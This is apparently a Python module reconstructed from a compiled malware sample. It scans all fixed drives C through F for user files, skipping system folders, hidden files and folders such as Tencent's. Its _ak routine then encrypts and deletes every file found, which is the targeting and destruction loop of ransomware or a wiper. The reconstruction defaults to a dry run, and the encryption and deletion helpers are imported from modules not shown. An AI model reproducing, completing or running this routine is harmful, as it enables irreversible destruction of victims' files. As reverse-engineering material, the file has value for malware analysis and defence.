# Recovered module: src.py.com.yun.mao.ade._ade_sing
# Filesystem scan policy reconstructed from the Nuitka constants blob.
# Destructive operations are dry-run by default in this reconstruction.
from __future__ import annotations

import os
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path



SKIP_DIR_NAMES = frozenset(
    {
        "documents and settings",
        "output",
        "tencent files",
        "windows",
        "recovery",
        "appdata",
        "$winreagent",
        "tencent",
        "program files",
        "lib",
        "node_modules",
        "system volume information",
        "windows.old",
        "config.msi",
        "debug",
        "$recycle.bin",
        "perflogs",
        "ghidra-master",
        "resource",
        "site-packages",
        "program files (x86)",
        "programdata",
    }
)
SKIP_FILE_NAMES = frozenset({"license.txt", "readme.md"})
SKIP_ATTRS = 0x2 | 0x4 | 0x400  # hidden, system, reparse point


def _should_skip_dir(entry) -> bool:
    name = entry.name.lower()
    if name.startswith(".") or name in SKIP_DIR_NAMES:
        return True
    try:
        if entry.is_symlink():
            return True
        attrs = entry.stat(follow_symlinks=False).st_file_attributes
        if attrs & SKIP_ATTRS:
            return True
    except OSError:
        return True
    return False


def _scan_one_drive(root: str) -> set[str]:
    found: set[str] = set()
    stack = [root]
    while stack:
        current = stack.pop()
        try:
            it = os.scandir(current)
        except OSError:
            continue
        with it:
            for entry in it:
                try:
                    if entry.is_dir(follow_symlinks=False):
                        if not _should_skip_dir(entry):
                            stack.append(entry.path)
                    elif entry.is_file(follow_symlinks=False):
                        if entry.name.lower() not in SKIP_FILE_NAMES:
                            found.add(entry.path)
                except OSError:
                    continue
    return found


def _ade_sing(dry_run: bool = True) -> set[str]:
    """Scan all fixed drives for candidate paths."""
    drives = [f"{letter}:\\" for letter in "CDEF" if Path(f"{letter}:\\").exists()]
    all_paths: set[str] = set()
    with ThreadPoolExecutor(max_workers=4) as executor:
        futures = [executor.submit(_scan_one_drive, root) for root in drives]
        for future in as_completed(futures):
            try:
                all_paths.update(future.result())
            except Exception:
                continue
    return all_paths


def encrypt_one(file_path: str, dry_run: bool = True) -> bool:
    if dry_run:
        return True
    try:
        from . import ad_t

        ad_t.ad_t(file_path)
        return True
    except Exception:
        return False


def delete_one(file_path: str, dry_run: bool = True) -> bool:
    if dry_run:
        return True
    try:
        from ..util.need import utils

        utils.safe_del_file(file_path)
        return True
    except Exception:
        return False


def _ak(dry_run: bool = True) -> None:
    for path in _ade_sing(dry_run=dry_run):
        encrypt_one(path, dry_run=dry_run)
        delete_one(path, dry_run=dry_run)
